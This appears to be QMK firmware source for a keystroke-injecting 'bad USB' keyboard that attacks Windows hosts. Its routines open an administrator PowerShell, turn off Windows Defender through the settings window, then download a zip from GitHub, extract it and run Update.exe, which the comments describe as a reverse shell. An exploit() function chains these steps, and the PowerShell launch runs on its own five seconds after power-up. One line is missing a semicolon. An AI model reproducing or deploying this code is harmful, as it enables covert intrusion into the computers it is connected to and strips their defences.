#include "bucky.h"

static uint16_t key_timer;

// Timer function
void delay(uint16_t time) {
    key_timer = timer_read();
    while (timer_elapsed(key_timer) < time) {}
}

// Launch the system's default browser
void default_browser(void) {
    SEND_STRING(SS_TAP(X_WWW_HOME()));
}

// Opens the Run command window (Left GUI + r)
void win_run(void) {
    SEND_STRING(SS_DOWN(X_LGUI)"r"SS_UP(X_LGUI));
}

// System power down
void shutdown(void) {
   SEND_STRING(SS_TAP(X_SYSTEM_POWER));
}

// Launch PowerShell
void powershell(void) {
    win_run();
    delay(50);
    SEND_STRING("powershell");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Elevate user privileges to administrator from PowerShell
void elevate_privileges() {
    SEND_STRING("start-process PowerShell -verb runas");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Start PowerShell as an administrator
void powershell_admin(void) {
    win_run();
    delay(50);
    SEND_STRING("powershell");
    SEND_STRING(SS_DOWN(X_LCTRL)SS_DOWN(X_LSHIFT)SS_TAP(X_ENTER)SS_UP(X_LCTRL)SS_UP(X_LSHIFT));
    delay(500);
    SEND_STRING(SS_TAP(X_LEFT));
    delay(300);
    SEND_STRING(SS_TAP(X_ENTER));
    delay(50)
    // Relocate to root
    SEND_STRING("cd ~");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Disable Windows Defender through the GUI
void disable_windefend(void) {
    SEND_STRING(SS_TAP(X_LGUI));
    delay(300);
    SEND_STRING("Virus & threat protection");
    delay(300);
    SEND_STRING(SS_TAP(X_ENTER));
    delay(600);
    for (int i = 0; i < 4; i++) {
        SEND_STRING(SS_TAP(X_TAB));
        delay(300);
    }
    SEND_STRING(SS_TAP(X_ENTER));
    delay(300);
    SEND_STRING(SS_TAP(X_SPACE));
    delay(500);
    SEND_STRING(SS_TAP(X_LEFT));
    delay(300);
    SEND_STRING(SS_TAP(X_ENTER));
    delay(200);
    SEND_STRING(SS_TAP(X_TAB));
    delay(200);
    SEND_STRING(SS_TAP(X_SPACE));
    delay(200);
    SEND_STRING(SS_TAP(X_TAB));
    delay(200);
    SEND_STRING(SS_TAP(X_SPACE));
    delay(200);
    SEND_STRING(SS_TAP(X_TAB));
    delay(200);
    SEND_STRING(SS_TAP(X_TAB));
    delay(200);
    SEND_STRING(SS_TAP(X_SPACE));
    delay(200);
}

// Closes the currently selected window
void close_window(void) {
    SEND_STRING(SS_DOWN(X_LALT)SS_TAP(X_F4)SS_UP(X_LALT));
}

// Initiate a reverse shell using a normal payload (assumes administrator privileges in PowerShell)
void initiate_revshell(void) {
    SEND_STRING("mkdir tmp");
    SEND_STRING(SS_TAP(X_ENTER));
    delay(100);
    SEND_STRING("curl https://github.com/Volanns/QMKPhantomKB/raw/main/important.zip -o ~\\tmp\\important.zip");
    SEND_STRING(SS_TAP(X_ENTER));
    delay(30000);
    SEND_STRING("cd tmp");
    SEND_STRING(SS_TAP(X_ENTER));
    delay(100);
    SEND_STRING("tar -xf .\\important.zip");
    SEND_STRING(SS_TAP(X_ENTER));
    delay(100);
    SEND_STRING(".\\Update.exe");
    SEND_STRING(SS_TAP(X_ENTER));
}

// Run the attack sequence
void exploit(void) {
    disable_windefend();
    close_window();
    delay(100);
    powershell_admin();
    delay(300);
    initiate_revshell();
}

// Called after every matrix scan
void matrix_scan_user(void) {
    static uint8_t finished = 0;

    if (timer_read() > 5000 && !finished) {
        //reset_keyboard();
        //exploit();
        powershell_admin();
        finished = 1;
    }
}

// rules.mk is where various features of the keybaord are toggled